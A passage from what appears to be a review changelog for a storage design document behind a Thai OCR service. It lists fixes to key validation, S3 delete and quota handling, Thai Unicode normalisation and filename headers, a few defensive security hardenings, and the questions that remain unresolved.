   the *second* reason (alongside `Content-Length`) the adapter must switch to multipart.
7. **§1.1 — stale claim that the local `list` walk must "skip `tmp/`".** With
   `STORAGE_ROOT=…/objects` (§4.3), `tmp/` is outside the root and unreachable. Corrected, and the
   structural argument (a root that cannot contain it beats a rule someone can forget) stated.
8. **Cross-reference rot throughout** — the document had been renumbered without updating pointers.
   Fixed: §1.1 presign "§7.2"→§6.2 leak 2; §1.2 GC "§6"→§5.2; §2.2 Content-Type "§8"→§7.2; §3.3
   attack 6 "§8"→§7.2; §4.4 "transaction ordering §6"→§5.2; §6.2 leak 2 "§8"→§7.1; §3.3 attack 1's
   `#resolve()`→`resolve()`.

### Gaps filled (demanded by the brief or implied by the design, not answered)

9. **No Python key validator at all.** `NewType` is a runtime no-op — verified. The worker writes
   `page`/`thumbnail`/`derivative` objects to the same tree and receives keys as JSON strings, so
   every §3 guarantee was TypeScript-only. Added §1.3.1 with the full `assert_safe_object_key`.
10. **Python's `$` matches before a trailing newline** (JS's does not) — verified. A transliterated
    `KEY_RE` would admit `"…\n"`. `\Z` + `fullmatch` mandated.
11. **No prefix validator, and `assertSafeObjectKey` would have rejected every legitimate `list`
    call** (it demands exactly 7 segments and no trailing `/`, while §5.4 passes `{tenantId}/`).
    Added `KeyPrefix`, `assertSafeKeyPrefix`, and the two sanctioned constructors (§3.2.1) — with
    per-segment anchors, which is the direct fix for finding 2's class of mistake.
12. **`deleteMany` partial-failure was undefined**, and S3's `DeleteObjects` reports per-key errors
    inside an HTTP **200**. §5.2's worker marked all 1000 rows complete on resolve, so one
    transient error → permanently orphaned bytes plus a row claiming they are gone, breaking the
    section's own "no orphan file" proof. Added the all-or-throw contract (§1.2.2) and rewrote the
    worker to consume `error.remaining`.
13. **The GC worker never incremented `attempts` or wrote `lastError`,** although the prose claimed
    "retry bounded: attempts < 10". A permanently-failing key would have retried every cycle
    forever, silently. Rewritten with `FOR UPDATE SKIP LOCKED`, a real counter, exponential
    backoff, and an alert on the terminal state.
14. **Quota ordering contradiction.** §4.5 called itself "reserve-then-commit" but the actual flow
    wrote bytes first, so the quota was checked after the disk was spent, N concurrent uploads
    could each pass, and every rejection orphaned an object. Replaced with a genuine two-phase
    reservation (`bytes_pending` + `storage_reservations` + expiry sweeper), every failure path
    tabulated, and the "don't hold the row lock across a 500 MB transfer" trap named.
15. **Unbounded upload when `contentLength` is absent.** `(opts.contentLength ?? 0) + RESERVE`
    degenerates to "is there 5 GiB free", so a chunked stream ran until `ENOSPC`. Added
    `MAX_UPLOAD_BYTES`, a worst-case reservation, a running in-loop cap (a declared length is a
    client claim, not a fact), and a short-stream check.
16. **No `HEAD` handler**, despite §1.1 justifying `stat`'s existence by exactly that use. Next.js
    synthesises `HEAD` from `GET`, streaming the whole object and discarding it. Added §7.1.1.
17. **`ifAbsent` had no S3 implementation** — only the local `link()`. Added the conditional-write
    (`If-None-Match: '*'` → 412) mapping, plus the rule that a backend without atomic
    create-or-fail must refuse at construction rather than degrade to check-then-write.
18. **`existsMany`'s S3 implementation was hand-waved** ("one `ListObjectsV2` on the document
    prefix") with no grouping rule and no >1000-key handling. Written out in §1.2.1 with the
    1-key/HeadObject threshold justified.
19. **`export`'s 7-day TTL had no enforcement mechanism**, and §6.2 leak 7 bans the obvious one
    (lifecycle expiration). Specified as a `storage_gc_queue` row inserted at creation time.
20. **`AbortIncompleteMultipartUpload`** — the one lifecycle rule that *is* required and was
    missing; abandoned parts are invisible to `list`, absent from `storage_objects`, and billed.
21. **Attack-7 Defence 3 (sha256 dedup) had no schema support.** Added the partial unique index,
    scoped to `(tenant_id, sha256)` — with the reason a *global* unique index would be a
    cross-tenant existence oracle.
22. **No download audit log** despite the PDPA framing. Added §7.5, including the rule that the
    filename and key must never enter a log line (Thai text can carry CR/LF and ANSI escapes).
23. **No id shape validation before Prisma.** A non-UUID URL segment against `@db.Uuid` raises a
    Prisma error → 500, distinguishable from the uniform 404, reintroducing the oracle the 404 was
    designed to close. Zod at the boundary, folded into `loadAuthorisedObject`.
24. **`Content-Length` on a streamed `Response`** — no note that Node may re-chunk, or that a `206`
    whose length disagrees with the delivered bytes silently corrupts the client's file. Added,
    with the fd-`fstat` rule for the `206` case.

### Thai-specific blind spots

25. **The SARA AM analysis stopped one step short, and the missing step reverses the advice.**
    U+0E33 has a **compatibility** decomposition (`<compat> 0E4D 0E32`), so while NFC/NFD do not
    unify `กำ` and `กํา` — the draft's correct half — **NFKC and NFKD do** (verified). Concluding
    "normalisation is useless for Thai" discards the one tool that answers the user-facing
    question. Rewritten as a three-column scheme: NFC for display (never NFKC — it would rewrite
    what the user typed), NFKC+lowercase in a derived `filename_fold` column for search and
    soft duplicate warnings, `sha256` for authoritative identity. Thai combining-class behaviour
    added for completeness.
26. **A Thai-only header-size bomb.** The ASCII fallback was capped at 100 chars but `filename*`
    was **unbounded** — and that is the parameter Thai uses. Thai costs **9 header bytes per
    character** (3 UTF-8 bytes × 3 percent-encoded chars), so a 1 000-character Thai filename emits
    a ~9 KB header and trips typical 4–8 KB proxy limits — failing **for Thai users only** while
    every English test passes. Added `FILENAME_MAX_CHARS = 120`, enforced at upload too, applied
    after NFC.
27. **No TIS-620 / Windows-874 story on the export path.** `charset=utf-8` was present but its
    necessity unstated, and there was no BOM decision — a BOM-less UTF-8 CSV opens as mojibake in
    Thai Windows Excel, which is the most-reported "your Thai OCR output is broken" bug and is not
    an OCR bug at all. Specified: mandatory `charset`, BOM for `.csv`/`.txt` exports, no BOM for
    JSON, UTF-8-only ingest.
28. **Thai digits ๐–๙ (U+0E50–U+0E59)** were implicitly covered by the ASCII allowlist but the
    document only ever named `U+0E00..U+0E7F` as "Thai consonants and vowels". Called out
    explicitly, since "strip Thai letters" is a filter that routinely misses them.

### Security / robustness

29. **Error messages leak absolute paths and keys** (`StorageError('already-exists', abs)`,
    `StorageError('not-found', key)`). An error message can reach a 500 body or an unredacted log;
    a key discloses tenant ids, document ids, and the on-disk layout. Contract added to §1.2 and
    restated at §3.4.
30. **§3.4 brace 4 does a path-based `realpath` after `open`,** which contradicts the document's own
    attack-10 rule ("never check-then-use a path"). It is additive-only and therefore not a
    vulnerability, but the inconsistency was unlabelled. Annotated as advisory defence-in-depth,
    with `(st.dev, st.ino)` named as the fd-anchored authority and an ERROR-level alert on
    mismatch.
31. **Decompression / render bombs** — storage bounds stored size, not rasterised size, and the
    `kind=page` pipeline is what would try. Added as open question 8 so §4.4 is not misread as
    complete cover.
32. **`quarantine/` is decorative** — it appears in the layout with no producer and no scanner.
    Flagged: implement it or remove it, rather than implying a control that does not run.

### Fabrication check

33. **§8 named the model.** The branches were headed "Qwen is text-only" / "Qwen is
    vision-capable", asserting the model's identity as settled. It is not: the endpoint, model
    name, model list, and image-input capability are all **UNRESOLVED**, and the only `qwen`
    strings on this machine are Alibaba *public cloud* aliases in an unrelated project — different
    system, not evidence. Rewritten in terms of the only property that changes the storage design
    (does the gateway accept image input), with a standing UNRESOLVED banner. No endpoint, port,
    model name, or capability is asserted anywhere in this document.
34. The `~/.EasyOCR/model/thai.pth` observation was being used adjacent to gateway claims; clarified
    that it is evidence of *local OCR experimentation*, not of anything about the gateway.

### What remains genuinely unknowable in this session

- **The AI gateway** — endpoint, model name, model list, and image-input support. Not derivable
  from any readable file on this workstation, and the only way to settle it (contacting the host)
  is prohibited. Storage is deliberately branch-invariant so this blocks nothing here.
- **The exact date `minio/minio` was archived.** The API exposes the archived *state* but no
  `archived_at`; secondary sources disagree (February vs April 2026). Immaterial to the decision.
- **PDPA retention and audit-log retention periods** — legal questions, no counsel source
  available. Both are designed as single constants.
- **Cloudflare R2 parity** for `Range`, multipart, conditional writes, and full-object CRC
  checksums — requires an account and live calls.
- **Backfill throughput and VPS egress bandwidth** — requires contacting a production host.
- **Whether `/data` and the XFS volume behave as designed** — `/data` does not exist on this
  workstation; §4 is a target-host design, not an observation, and is labelled as such.
- **The house stack's exact Node patch level** (22.23.1 pinned vs 22.22.3 here). No API used in
  this document differs between them, but the probes were run on 22.22.3.
- **jawbong's outbox implementation** was not read (only its `process/` tree was grepped), so the
  outbox pattern in §5.2 is adopted on the orchestrator's brief, not on inspected code. Unchanged
  from the draft's own honest disclosure.
